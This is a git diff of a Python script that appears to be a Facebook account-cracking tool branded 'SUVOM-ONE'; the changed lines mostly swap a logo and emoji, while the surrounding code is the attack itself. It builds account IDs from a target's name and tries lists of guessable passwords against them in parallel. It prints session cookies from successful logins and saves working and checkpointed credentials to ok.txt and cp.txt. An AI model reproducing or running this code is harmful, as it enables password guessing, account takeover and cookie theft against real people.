@@ -78,12 +78,15 @@ for xd in range(10000):
     ugen.append(uaku2)
 
 os.system("xdg-open https://https://github.com/SuvomK ")
-logo = (""" 
-███████ ██    ██ ██    ██  ██████  ███    ███        ██████  ███    ██ ███████ 
-██      ██    ██ ██    ██ ██    ██ ████  ████       ██    ██ ████   ██ ██      
-███████ ██    ██ ██    ██ ██    ██ ██ ████ ██ █████ ██    ██ ██ ██  ██ █████   
-     ██ ██    ██  ██  ██  ██    ██ ██  ██  ██       ██    ██ ██  ██ ██ ██      
-███████  ██████    ████    ██████  ██      ██        ██████  ██   ████ ███████                
+logo = ("""  
+   _____ _    ___      ______  __  __         ____  _   _ ______ 
+  / ____| |  | \ \    / / __ \|  \/  |       / __ \| \ | |  ____|
+ | (___ | |  | |\ \  / / |  | | \  / |______| |  | |  \| | |__   
+  \___ \| |  | | \ \/ /| |  | | |\/| |______| |  | | . ` |  __|  
+  ____) | |__| |  \  / | |__| | |  | |      | |__| | |\  | |____ 
+ |_____/ \____/    \/   \____/|_|  |_|       \____/|_| \_|______|
+                                                                 
+                                                                 
 """)
 
 class Main:
@@ -115,10 +118,10 @@ def v1():
     user=[]
     os.system('clear')
     print(logo)
-    kode = input(' [🔥]  TERGET FIRST NAME : ')
-    kodex = input(' [🔥] TERGET LAST NAME :  ')
-    print(' [🤝] example Doamin : @gmail.com, @yahoo.com ')
-    doamin = input(' [📧]  Input Doamin  : ')
+    kode = input(' [😀]  TERGET FIRST NAME : ')
+    kodex = input(' [🥵] TERGET LAST NAME :  ')
+    print(' [🥵] example Doamin : @gmail.com, @yahoo.com ')
+    doamin = input(' [🥵]  Input Doamin  : ')
     limit = int(input('[?] ENTET YOUR CRACK LIMIT : '))
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(1,4))
@@ -127,25 +130,25 @@ def v1():
         os.system('clear')
         print(logo)
         tl = str(len(user))
-        print(' [🔥]  Total ids:\033[1;92m '+tl)
-        print(f"\033[1;97m [🔥]  Target Doamin:\033[1;92m {doamin}")
-        print(' \033[1;97m[🔥]  The process has been started')
-        print(' [🔥]  Wait for ids ')
+        print(' [😋]  Total ids:\033[1;92m '+tl)
+        print(f"\033[1;97m [😋]  Target Doamin:\033[1;92m {doamin}")
+        print(' \033[1;97m[😋]  The process has been started')
+        print(' [😋]  Wait for ids ')
         print(50*'_')
         for guru in user:
             uid = kode+kodex+guru+doamin
             pwx = [kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345']
             yaari.submit(rcrack1,uid,pwx,tl)
     print(50*'_')
-    print(' [♥] Crack process has been completed')
-    print(' [♥] Ids saved in ok.txt,cp.txt')
+    print(' [😋] Crack process has been completed')
+    print(' [😋] Ids saved in ok.txt,cp.txt')
     print(50*'_')
 def v2():
     user=[]
     os.system('clear')
     print(logo)
-    kode = input(' [🔥]  TERGET FIRST NAME : ')
-    kodex = input(' [🔥] TERGET FIRST NAME :  ')
+    kode = input(' [😋]  TERGET FIRST NAME : ')
+    kodex = input(' [😋] TERGET FIRST NAME :  ')
     doamin = '.'
     limit = int(input('[?] ENTER YOUR CRACK LIMIT : '))
     for nmbr in range(limit):
@@ -155,18 +158,18 @@ def v2():
         os.system('clear')
         print(logo)
         tl = str(len(user))
-        print(' [🔥]  Total ids:\033[1;92m '+tl)
-        print(f"\033[1;97m[♥]  Target Doamin:\033[1;92m Facebook CLONING (name)")
-        print(' \033[1;97m[♥]  The process has been started')
-        print(' [♥]  Wait for ids ')
+        print(' [😋]  Total ids:\033[1;92m '+tl)
+        print(f"\033[1;97m[😀]  Target Doamin:\033[1;92m Facebook CLONING (name)")
+        print(' \033[1;97m[😀]  The process has been started')
+        print(' [😀]  Wait for ids ')
         print(50*'_')
         for guru in user:
             uid = kode+doamin+kodex+guru
             pwx = [kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345',kode+'@123',kode+'@1234',kode+'@12345',kode+guru,kodex+'@123',kodex+'@1234',kodex+'@12345']
             yaari.submit(rcrack1,uid,pwx,tl)
     print(50*'_')
-    print(' [♥] Crack process has been completed')
-    print(' [♥] Ids saved in ok.txt,cp.txt')
+    print(' [😀] Crack process has been completed')
+    print(' [😀] Ids saved in ok.txt,cp.txt')
     print(50*'_')
 def v3():
     user=[]
@@ -191,18 +194,18 @@ def v3():
         os.system('clear')
         print(logo)
         tl = str(len(user))
-        print(' \033[1;33m[♥]  TOTAL IDS :\033[1;92m '+tl)
-        print(f"\033[1;33m[♥]  YOUR TERGET CRACK MENU:\033[1;92m {doamin}")
-        print(' \033[1;33m[♥]  THE CRACK PROCESS HAS BEEN STARTED')
-        print(' \033[1;33m[♥]  WAIT FOR IDS ')
+        print(' \033[1;33m[😀]  TOTAL IDS :\033[1;92m '+tl)
+        print(f"\033[1;33m[😀]  YOUR TERGET CRACK MENU:\033[1;92m {doamin}")
+        print(' \033[1;33m[😀]  THE CRACK PROCESS HAS BEEN STARTED')
+        print(' \033[1;33m[😀]  WAIT FOR IDS ')
         print(50*'_')
         for guru in user:
             uid = kode+kodex+kod+guru
             pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'bangladesh']
             yaari.submit(rcrack1,uid,pwx,tl)
     print(50*'_')
-    print(' [♥] Crack process has been completed')
-    print(' [♥] Ids saved in ok.txt,cp.txt')
+    print(' [🙂] Crack process has been completed')
+    print(' [🙂] Ids saved in ok.txt,cp.txt')
     print(50*'_')
 def rcrack1(uid,pwx,tl):
     global loop
@@ -247,22 +250,22 @@ def rcrack1(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print(f"\033[38;5;46m[SUVOM-ONE-OK🌻] {uid}|{ps}")
-                print(f"\n[COOKIE🎁] : {coki}")
+                print(f"\033[38;5;46m[SUVOM-ONE-OK🙂] {uid}|{ps}")
+                print(f"\n[COOKIE🙂] : {coki}")
                 open('/sdcard/SUVOM-ONE/ok.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(uid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[82:97]
-                print(f"\x1b[38;5;196m[SUVOM-ONE-CP❌] {uid}|{ps}")
+                print(f"\x1b[38;5;196m[SUVOM-ONE-CP🙂] {uid}|{ps}")
                 open('/sdcard/SUVOM-ONE-CP.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(uid)
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\033[m[SUVOM-ONE💥] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
+        sys.stdout.write(f'\r\033[m[SUVOM-ONE🙂] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
         sys.stdout.flush()
     except:
         pass
